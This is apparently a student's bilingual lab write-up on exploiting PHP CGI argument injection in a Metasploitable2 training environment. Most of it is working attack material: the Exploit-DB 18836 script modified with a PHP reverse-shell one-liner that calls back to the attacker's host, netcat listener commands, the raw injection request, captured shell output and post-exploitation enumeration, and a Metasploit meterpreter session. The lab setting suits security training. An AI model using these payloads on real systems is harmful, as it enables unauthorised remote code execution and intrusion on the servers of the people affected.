---
layout: post
title: "Targeting PHP"
date: "2023-05-15"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Linux Black Box Penetration Test（Linux 黑盒渗透测试）
## Targeting PHP（针对 PHP）
# Demo: Targeting PHP（演示：针对 PHP）
We're going to be taking a look at the process of exploiting PHP that is being used as part of the LAMP stack for the Apache web server, as well as the web applications that are being hosted on the target system. Whenever you're performing a penetration test that involves web applications, you need to analyze or explore all the components that make up the web server, right from the web server technology which in this case is Apache, to the operating system, which is Linux, as well as the web server technology which in this case is PHP. And the database can either be MySQL or PostgreSQL.

We are primarily going to be taking a look at identifying a vulnerability that affects the version of PHP that's runing on the web server on the target, and how it can be exploited to provide us with a reverse shell.

```
nmap -sV -sC -p 80 10.2.19.172
```

`-sV`: perform a service version detection scan.

`-sC`: the default script scan.

```
http://10.2.19.172
```

If the target system is running a LAMP stack, or is hosting web applications designed in PHP, in some cases diagnostic or configuration files pertinent to PHP may be left over. And one of them is the phpinfo.php file, which will tell you what version of PHP is running on the target.

```
http://10.2.19.172/phpinfo.php
```

And in this case, the target is running PHP version 5.2.4 on Ubuntu. The Server API is CGI/FastCGI.

Configuration file, that provides you with the directory to the PHP configuration file, and the Loaded Configuration File where this information is obtained from.

Version lower that 5.3.1 are vulnerable to a command injection attack, or remote code execution attack.

You can also search for the exact PHP version.

```
searchsploit php cgi
```

```
searchsploit -m 18836
```

```
vim 18836.py
```

These specific version of PHP are vulnerable to CGI argument injection exploit.

[PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection](https://www.exploit-db.com/exploits/18836)

And in terms of the exploit code itself, it will inject PHP code for execution. 

```php
pwn_code = """<?php phpinfo();?>""" 
```

That is the exploit code here that we need to modify. By default, the default PHP command that has been specified here will simply print out the PHP information that we were able to enumerate from the web server.

What this means is that we can execute PHP code, and we can obtain a reverse shell by utilizing a PHP reverse shell one-liner.

```
python2 18836.py
python2 18836.py 10.2.19.172 80
```

The code specified within the PHP brackets here is phpinfo. And it prints out the exact version of PHP.

We can modify the pwn_code to provide us with a reverse shell. 

```
vim 18836.py
```

[Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)

```php
$sock=fsockopen("IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");
```

I've copied over the PHP reverse shell one-liner. And this PHP code will connect to our listeners. It's then going to execute a Bourne shell session. And we have the descriptors right over here. So if this doesn't work, then we can modify the descriptors from 3 to 4, or maybe 5.

Kali Linux : 10.10.11.2

```php
$sock=fsockopen("10.10.11.2",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

Paste it within the PHP tags here.

```php
pwn_code = """<?php $sock=fsockopen("10.10.11.2",1234);exec("/bin/sh -i <&3 >&3 2>&3"); ?>"""
```

Set up my Netcat listener here. And we should receive a reverse shell.

```
nc -nvlp 1234
```

```
python2 18836.py 10.2.19.172 80
```

It runs successfully. We don't get any error code. This is the HTTP response code here. 200 that means that it was processed just fine.

However, if we take a look at our Netcat listener, we get a connection, but we don't obtain a bash session or a reverse shell.

That could be because of a few issues. We can probably modify the descriptors here.

```
vim 18836.py
```

Get rid of the 3, and change that to a 4. And I'll do that for all the descriptors there.

```php
pwn_code = """<?php $sock=fsockopen("10.10.11.2",1234);exec("/bin/sh -i <&4 >&4 2>&4"); ?>"""
```

Set up a new Netcat listener.

```
nc -nvlp 1234
```

```
python2 18836.py 10.2.19.172 80
```

And we obtain a reverse shell. And in this case, we have a Bourne shell. So to obtain a bash session:

```
nc -nvlp 1234
sh-3.2$ /bin/bash -i
www-data@d1d6a9361621:/var/www$ 
```

And we've obtained access to the target system remotely via reverse shell. So we currently have access via the www-data user which makes sense, because we exploited the Apache. We exploited the web server technology. And as a result, we inherit the permissions under which PHP executes code, which in this case is www-data. This is currently unprivileged access, which is where we will then move on to post exploitation and privilege escalation.

We've been able to obtain access.

List all the contents of the `/var/www` directory:

```
www-data@d1d6a9361621:/var/www$ ls -al
```

Enumerate the distribution information here:

```
www-data@d1d6a9361621:/var/www$ cat /etc/*release
```

Enumerate the kernel that's running:

```
www-data@d1d6a9361621:/var/www$ uname -r
```

That is how to exploit the PHP vulnerability in regards to the version that's running on the target and how to do it manually. You can also do this via the Metasploit Framework module. What I wanted to showcase here is that you don't need to rely on the Metasploit Framework for exploitation. You can also utilize well-developed exploits that have been documented well, and that are very easy to understand in regards to what we need to modify. We were able to gain access to the target system after two modifications to the exploit. And we've obtained access, and that's pretty much it from our point of view as a junior penetration tester.

It's all about learning new techniques and learning how to use new tools and getting an understanding of how everything works. Always take a look at public exploit code. Take a loot at how it works. Some exploit code is developed well, and will not give you any errors out of box. And you can launch them after a few modifications. 

# Targeting PHP（针对 PHP）
## Overview（概述）
Goal

This lab covers the process of exploiting a vulnerable version of PHP running on Apache on a Linux target.

目标

本实验涵盖了利用在 Linux 目标上的 Apache 上运行的易受攻击的 PHP 版本的过程。

## Tasks（任务）
Pre-requisites

1. Basic familiarity with Nmap.
2. Basic familiarity with the Metasploit Framework.

Requirements

This task does not have any requirements.

先决条件

1. 基本熟悉 Nmap。
2. 基本熟悉 Metasploit 框架。

要求

此任务没有任何要求。

## 复现视频内容
10.0.26.110    demo.ine.local

Kali Linux : 10.10.21.4

```
root@attackdefense:~# nmap -sV -sC -p 80 10.0.26.110
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-15 19:03 IST
Nmap scan report for demo.ine.local (10.0.26.110)
Host is up (0.0038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
```

```
http://10.0.26.110/
http://10.0.26.110/phpinfo.php
```

```
PHP Version 5.2.4-2ubuntu5.10

System 	Linux d1d6a9361621 5.4.0-1048-aws #50-Ubuntu SMP Mon May 3 21:44:17 UTC 2021 x86_64
Build Date 	Jan 6 2010 21:50:12
Server API 	CGI/FastCGI
Virtual Directory Support 	disabled
Configuration File (php.ini) Path 	/etc/php5/cgi
Loaded Configuration File 	/etc/php5/cgi/php.ini
Scan this dir for additional .ini files 	/etc/php5/cgi/conf.d
additional .ini files parsed 	/etc/php5/cgi/conf.d/gd.ini, /etc/php5/cgi/conf.d/mysql.ini, /etc/php5/cgi/conf.d/mysqli.ini, /etc/php5/cgi/conf.d/pdo.ini, /etc/php5/cgi/conf.d/pdo_mysql.ini
PHP API 	20041225
PHP Extension 	20060613
Zend Extension 	220060519
Debug Build 	no
Thread Safety 	disabled
Zend Memory Manager 	enabled
IPv6 Support 	enabled
Registered PHP Streams 	zip, php, file, data, http, ftp, compress.bzip2, compress.zlib, https, ftps
Registered Stream Socket Transports 	tcp, udp, unix, udg, ssl, sslv3, sslv2, tls
Registered Stream Filters 	string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, convert.iconv.*, bzip2.*, zlib.* 
```

```
root@attackdefense:~# searchsploit php cgi
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP 5.3.12/5.4.2 - CGI Argument Injection (Metasploit)                                                                                                    | php/remote/18834.rb
PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection                                                                                                           | php/remote/18836.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
root@attackdefense:~# searchsploit -m 18836
  Exploit: PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection
      URL: https://www.exploit-db.com/exploits/18836
     Path: /usr/share/exploitdb/exploits/php/remote/18836.py
File Type: Python script, ASCII text executable

Copied to: /root/18836.py


root@attackdefense:~# vim 18836.py
```

```php
def cgi_exploit():
        pwn_code = """<?php phpinfo();?>"""
```

```
root@attackdefense:~# python 18836.py 10.0.26.110 80
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.0.26.110
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

<?php phpinfo();?>

'HTTP/1.1 200 OK\r\nDate: Mon, 15 May 2023 13:48:51 GMT\r\nServer: Apache/2.2.8 (Ubuntu) DAV/2\r\nX-Powered-By: PHP/5.2.4-2ubuntu5.10\r\n
```

```php
def cgi_exploit():
        pwn_code = """<?php $sock=fsockopen("10.10.21.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>"""
```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
root@attackdefense:~# python 18836.py 10.0.26.110 80
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.0.26.110
Content-Type: application/x-www-form-urlencoded
Content-Length: 75

<?php $sock=fsockopen("10.10.21.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>

'HTTP/1.1 200 OK\r\nDate: Mon, 15 May 2023 13:57:11 GMT\r\nServer: Apache/2.2.8 (Ubuntu) DAV/2\r\nX-Powered-By: PHP/5.2.4-2ubuntu5.10\r\nContent-Length: 0\r\nContent-Type: text/html\r\n\r\n'

```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.26.110.
Ncat: Connection from 10.0.26.110:41870.

```

```php
def cgi_exploit():
        pwn_code = """<?php $sock=fsockopen("10.10.21.4",1234);exec("/bin/sh -i <&4 >&4 2>&4");?>"""
```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
root@attackdefense:~# python 18836.py 10.0.26.110 80
POST /?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input HTTP/1.1
Host: 10.0.26.110
Content-Type: application/x-www-form-urlencoded
Content-Length: 75

<?php $sock=fsockopen("10.10.21.4",1234);exec("/bin/sh -i <&4 >&4 2>&4");?>

```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.26.110.
Ncat: Connection from 10.0.26.110:41912.
sh: no job control in this shell
sh-3.2$ /bin/bash -i
/bin/bash -i
bash: no job control in this shell
www-data@d1d6a9361621:/var/www$ ls -al
ls -al
total 88
drwxr-xr-x  1 www-data www-data  4096 May 15 09:57 .
drwxr-xr-x  1 root     root      4096 May 20  2012 ..
-rw-------  1 www-data www-data   883 May 15 09:57 .bash_history
drwxrwxrwt  2 root     root      4096 May 20  2012 dav
drwxr-xr-x  8 www-data www-data  4096 May 20  2012 dvwa
-rw-r--r--  1 www-data www-data   891 May 20  2012 index.php
drwxr-xr-x 10 www-data www-data  4096 May 14  2012 mutillidae
drwxr-xr-x 11 www-data www-data  4096 May 14  2012 phpMyAdmin
-rw-r--r--  1 www-data www-data    19 Apr 16  2010 phpinfo.php
drwxr-xr-x  3 www-data www-data  4096 May 14  2012 test
drwxrwxr-x 22 www-data www-data 20480 Apr 19  2010 tikiwiki
drwxrwxr-x 22 www-data www-data 20480 Apr 16  2010 tikiwiki-old
drwxr-xr-x  7 www-data www-data  4096 Apr 16  2010 twiki
www-data@d1d6a9361621:/var/www$ cat /etc/*release
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
www-data@d1d6a9361621:/var/www$ uname -a
uname -a
Linux d1d6a9361621 5.4.0-1048-aws #50-Ubuntu SMP Mon May 3 21:44:17 UTC 2021 x86_64 GNU/Linux
www-data@d1d6a9361621:/var/www$ 
```

[PHP CGI Argument Injection](https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection/)

PHP CGI 参数注入

当作为 CGI 运行时，PHP 5.3.12 和 5.4.2 版本容易受到参数注入漏洞的影响。该模块利用 -d 标志设置 php.ini 指令以实现代码执行。从咨询中：“如果查询字符串中没有未转义的‘=’，则该字符串将拆分为‘+’（编码的空格）字符，经过 url 解码，传递给转义 shell 元字符的函数（“在系统中编码- “从 RFC 定义的方式”），然后将它们传递给 CGI 二进制文件。该模块还可用于利用 kingcope 披露并于 2013 年 6 月在野利用的 plesk 0day。

```
root@attackdefense:~# msfconsole -q
msf6 > search php cgi

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   9   exploit/multi/http/php_cgi_arg_injection                    2012-05-03       excellent  Yes    PHP CGI Argument Injection


Interact with a module by name or index. For example info 11, use 11 or use exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc

msf6 > use 9
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/php_cgi_arg_injection) > show options

Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.21.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 10.0.26.110
RHOSTS => 10.0.26.110
msf6 exploit(multi/http/php_cgi_arg_injection) > run

[*] Started reverse TCP handler on 10.10.21.4:4444 
[*] Sending stage (39282 bytes) to 10.0.26.110
[*] Meterpreter session 1 opened (10.10.21.4:4444 -> 10.0.26.110:51204 ) at 2023-05-15 19:50:05 +0530

meterpreter > sysinfo
Computer    : d1d6a9361621
OS          : Linux d1d6a9361621 5.4.0-1048-aws #50-Ubuntu SMP Mon May 3 21:44:17 UTC 2021 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
```